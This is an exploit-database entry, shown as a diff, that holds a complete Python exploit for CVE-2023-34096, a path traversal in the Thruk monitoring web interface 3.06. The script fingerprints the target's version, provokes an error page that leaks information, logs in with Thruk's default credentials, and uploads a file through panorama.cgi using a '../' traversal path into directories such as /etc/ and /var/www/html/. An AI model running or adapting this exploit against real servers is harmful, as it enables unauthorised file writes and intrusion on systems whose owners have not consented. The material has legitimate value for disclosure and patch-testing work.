@@ -1,0 +1,325 @@
+id: 38774
+date: 06/12/2023
+title: Thruk Monitoring Web Interface 3.06 - Path Traversal Exploit
+author: Galoget Latorre
+cves: CVE-2023-34096
+
+# Exploit Title: Thruk Monitoring Web Interface 3.06 - Path Traversal
+# Exploit Author: Galoget Latorre (@galoget)
+# CVE: CVE-2023-34096 (Galoget Latorre)
+# Vendor Homepage: https://thruk.org/
+# Software Link: https://github.com/sni/Thruk/archive/refs/tags/v3.06.zip
+# Software Link + Exploit + PoC (Backup): https://github.com/galoget/Thruk-CVE-2023-34096
+# CVE Author Blog: https://galogetlatorre.blogspot.com/2023/06/cve-2023-34096-path-traversal-thruk.html
+# GitHub Security Advisory: https://github.com/sni/Thruk/security/advisories/GHSA-vhqc-649h-994h
+# Affected Versions: <= 3.06
+# Language: Python 3.x
+# Tested on:
+#  - Ubuntu 22.04.5 LTS 64-bit
+#  - Debian GNU/Linux 10 (buster) 64-bit
+#  - Kali GNU/Linux 2023.1 64-bit
+#  - CentOS GNU/Linux 8.5.2111 64-bit
+
+
+#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+
+import sys
+import warnings
+import requests
+from bs4 import BeautifulSoup
+from termcolor import cprint
+
+
+# Usage: python3 exploit.py <target.site>
+# Example: python3 exploit.py http://127.0.0.1/thruk/
+
+
+# Disable warnings
+warnings.filterwarnings('ignore')
+
+
+# Set headers
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
+}
+
+
+def banner():
+    """
+    Function to print the banner
+    """
+
+    banner_text = """
+ __     __     __   __  __  __      __        __   __   __  
+/  \\  /|_  __   _) /  \\  _)  _) __   _) |__| /  \\ (__\\ /__  
+\\__ \\/ |__     /__ \\__/ /__ __)     __)    | \\__/  __/ \\__) 
+
+                                                               
+Path Traversal Vulnerability in Thruk Monitoring Web Interface ≤ 3.06
+Exploit & CVE Author: Galoget Latorre (@galoget)
+LinkedIn: https://www.linkedin.com/in/galoget
+"""
+    print(banner_text)
+
+
+def usage_instructions():
+    """
+    Function that validates the number of arguments.
+    The application MUST have 2 arguments:
+    - [0]: Name of the script
+    - [1]: Target URL (Thruk Base URL)
+    """
+    if len(sys.argv) != 2:
+        print("Usage: python3 exploit.py <target.site>")
+        print("Example: python3 exploit.py http://127.0.0.1/thruk/")
+        sys.exit(0)
+
+
+def check_vulnerability(thruk_version):
+    """
+    Function to check if the recovered version is vulnerable to CVE-2023-34096.
+    Prints additional information about the vulnerability.
+    """
+    try:
+        if float(thruk_version[1:5]) <= 3.06:
+            if float(thruk_version[4:].replace("-", ".")) < 6.2:
+                cprint("[+] ", "green", attrs=['bold'], end = "")
+                print("This version of Thruk is ", end = "")
+                cprint("VULNERABLE ", "red", attrs=['bold'], end = "")
+                print("to CVE-2023-34096!")
+                print(" |  CVE Author Blog: https://galogetlatorre.blogspot.com/2023/06/cve-2023-34096-path-traversal-thruk.html")
+                print(" |  GitHub Security Advisory: https://github.com/sni/Thruk/security/advisories/GHSA-vhqc-649h-994h")
+                print(" |  CVE MITRE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34096")
+                print(" |  CVE NVD NIST: https://nvd.nist.gov/vuln/detail/CVE-2023-34096")
+                print(" |  Thruk Changelog: https://www.thruk.org/changelog.html")
+                print(" |  Fixed version: 3.06-2+")
+                print("")
+                return True
+            else:
+                cprint("[-] ", "red", attrs=['bold'], end = "")
+                print("It looks like this version of Thruk is NOT VULNERABLE to CVE-2023-34096.")
+                return False
+    except:
+        cprint("[-] ", "red", attrs=['bold'], end = "")
+        print("There was an error parsing Thruk's version.\n")
+        return False
+
+
+def get_thruk_version():
+    """
+    Function to get Thruk's version via web scraping.
+    It also verifies the title of the website to check if the target is a Thruk instance.
+    """
+    response = requests.get(target, headers=headers, allow_redirects=True, verify=False, timeout=10)
+    html_soup = BeautifulSoup(response.text, "html.parser")
+
+    if "<title>Thruk Monitoring Webinterface</title>" not in response.text:
+        cprint("[-] ", "red", attrs=['bold'], end = "")
+        print("Verify if the URL is correct and points to a Thruk Monitoring Web Interface.")
+        sys.exit(-1)
+    else:
+        # Extract version anchor tag
+        version_link = html_soup.find_all("a", {"class": "link text-sm"})
+
+        if len(version_link) == 1 and version_link[0].has_attr('href'):
+            thruk_version = version_link[0].text.strip()
+            cprint("[+] ", "green", attrs=['bold'], end = "")
+            print(f"Detected Thruk Version (Public Banner): {thruk_version}\n")
+            return thruk_version
+        else:
+            cprint("[-] ", "red", attrs=['bold'], end = "")
+            print("There was an error retrieving Thruk's version.")
+            sys.exit(-1)
+
+
+def get_error_info():
+    """
+    Function to cause an error in the target Thruk instance and collect additional information via web scraping.
+    """
+    # URL that will cause an error
+    error_url = target + "//cgi-bin/login.cgi"
+
+    # Retrieve Any initial Cookies
+    error_response = requests.get(error_url,
+                                  headers=headers,
+                                  allow_redirects=False,
+                                  verify=False,
+                                  timeout=10)
+
+    cprint("[*] ", "blue", attrs=['bold'], end = "")
+    print("Trying to retrieve additional information...\n")
+    try:
+        # Search for the error tag
+        html_soup = BeautifulSoup(error_response.text, "html.parser")
+        error_report = html_soup.find_all("pre", {"class": "text-left mt-5"})[0].text
+        if len(error_report) > 0:
+            # Print Error Info
+            error_report = error_report[error_report.find("Version"):error_report.find("\n\nStack")]
+            cprint("[+] ", "green", attrs=['bold'], end = "")
+            print("Recovered Information: \n")
+            parsed_error_report = error_report.split("\n")
+            for error_line in parsed_error_report:
+                print(f"     {error_line}")
+    except:
+        cprint("[-] ", "red", attrs=['bold'], end = "")
+        print("No additional information available.\n")
+
+
+def get_thruk_session_auto_login():
+    """
+    Function to login into the Thruk instance and retrieve a valid session.
+    It will use default Thruk's credentials available here:
+    - https://www.thruk.org/documentation/install.html
+    
+    Change credentials if required.
+    """
+    # Default Credentials - Change if required
+    username = "thrukadmin" # CHANGE ME
+    password = "thrukadmin" # CHANGE ME
+    params = {"login": username, "password": password}
+
+    cprint("[*] ", "blue", attrs=['bold'], end = "")
+    print(f"Trying to autenticate with provided credentials: {username}/{password}\n")
+
+    # Define Login URL
+    login_url = "cgi-bin/login.cgi"
+
+    session = requests.Session()
+    # Retrieve Any initial Cookies
+    session.get(target, headers=headers, allow_redirects=True, verify=False)
+
+    # Login and get thruk_auth Cookie
+    session.post(target + login_url, data=params, headers=headers, allow_redirects=False, verify=False)
+
+    # Get Cookies as dictionary
+    cookies = session.cookies.get_dict()
+
+    # Successful Login
+    if cookies.get('thruk_auth') is not None:
+        cprint("[+] ", "green", attrs=['bold'], end = "")
+        print("Successful Authentication!\n")
+        cprint("[+] ", "green", attrs=['bold'], end = "")
+        print(f"Login Cookie: thruk_auth={cookies.get('thruk_auth')}\n")
+        return session
+    # Failed Login
+    else:
+        if cookies.get('thruk_message') == "fail_message~~login%20failed":
+            cprint("[-] ", "red", attrs=['bold'], end = "")
+            print("Login Failed, check your credentials.")
+            sys.exit(401)
+
+
+def cve_2023_34096_exploit_path_traversal(logged_session):
+    """
+    Function that attempts to exploit the Path Traversal Vulnerability.
+    The exploit will try to upload a PoC file to multiple common folders.
+    This to prevent permissions errors to cause false negatives.
+    """
+    cprint("[*] ", "blue", attrs=['bold'], end = "")
+    print("Trying to exploit: ", end = "")
+    cprint("CVE-2023-34096 - Path Traversal\n", "yellow", attrs=['bold'])
+
+    # Define Upload URL
+    upload_url = "cgi-bin/panorama.cgi"
+
+    # Absolute paths
+    common_folders = ["/tmp/",
+                      "/etc/thruk/plugins/plugins-enabled/",
+                      "/etc/thruk/panorama/",
+                      "/etc/thruk/bp/",
+                      "/etc/thruk/thruk_local.d/",
+                      "/var/www/",
+                      "/var/www/html/",
+                      "/etc/",
+    ]
+
+    # Upload PoC file to each folder
+    for target_folder in common_folders:
+        # PoC file extension is jpg due to regex validations of Thruk.
+        # Nevertheless this issue can still cause damage in different ways to the affected instance.
+        files = {'image': ("exploit.jpg", "CVE-2023-34096-Exploit-PoC-by-galoget")}
+        data = {"task": "upload",
+                "type": "image",
+                "location": f"backgrounds/../../../..{target_folder}"
+        }
+
+        upload_response = logged_session.post(target + upload_url,
+                                    data=data,
+                                    files=files,
+                                    headers=headers,
+                                    allow_redirects=False,
+                                    verify=False)
+
+        try:
+            upload_response = upload_response.json()
+            if upload_response.get("msg") == "Upload successfull" and upload_response.get("success") is True:
+                cprint("[+] ", "green", attrs=['bold'], end = "")
+                print(f"File successfully uploaded to folder: {target_folder}{files.get('image')[0]}\n")
+            elif upload_response.get("msg") == "Fileupload must use existing and writable folder.":
+                cprint("[-] ", "red", attrs=['bold'], end = "")
+                print(f"File upload to folder \'{target_folder}{files.get('image')[0]}\' failed due to write permissions or non-existent folder!\n")
+            else:
+                cprint("[-] ", "red", attrs=['bold'], end = "")
+                print("File upload failed.\n")
+        except:
+            cprint("[-] ", "red", attrs=['bold'], end = "")
+            print("File upload failed.\n")
+
+
+
+if __name__ == "__main__":
+    banner()
+    usage_instructions()
+
+    # Change this with the domain or IP address to attack
+    if sys.argv[1] and sys.argv[1].startswith("http"):
+        target = sys.argv[1]
+    else:
+        target = "http://127.0.0.1/thruk/"
+
+    # Prepare Base Target URL
+    if not target.endswith('/'):
+        target += "/"
+
+    cprint("[+] ", "green", attrs=['bold'], end = "")
+    print(f"Target URL: {target}\n")
+
+    # Get Thruk version via web scraping
+    scraped_thruk_version = get_thruk_version()
+
+    # Send a request that will generate an error and collect extra info
+    get_error_info()
+
+    # Check if the instance is vulnerable to CVE-2023-34096
+    vulnerable_status = check_vulnerability(scraped_thruk_version)
+
+    if vulnerable_status:
+        cprint("[+] ", "green", attrs=['bold'], end = "")
+        print("The Thruk version found in this host is vulnerable to CVE-2023-34096. Do you want to try to exploit it?")
+
+        # Confirm exploitation
+        option = input("\nChoice (Y/N): ").lower()
+        print("")
+
+        if option == "y":
+            cprint("[*] ", "blue", attrs=['bold'], end = "")
+            print("The tool will attempt to exploit the vulnerability by uploading a PoC file to common folders...\n")
+            # Login into Thruk instance
+            valid_session = get_thruk_session_auto_login()
+            # Exploit Path Traversal Vulnerability
+            cve_2023_34096_exploit_path_traversal(valid_session)
+        elif option == "n":
+            cprint("[*] ", "blue", attrs=['bold'], end = "")
+            print("No exploitation attempts were performed, Goodbye!\n")
+            sys.exit(0)
+        else:
+            cprint("[-] ", "red", attrs=['bold'], end = "")
+            print("Unknown option entered.")
+            sys.exit(1)
+    else:
+        cprint("[-] ", "red", attrs=['bold'], end = "")
+        print("The current Thruk's version is NOT VULNERABLE to CVE-2023-34096.")
+        sys.exit(2)
+
+#  0day.today [2023-06-23]  #
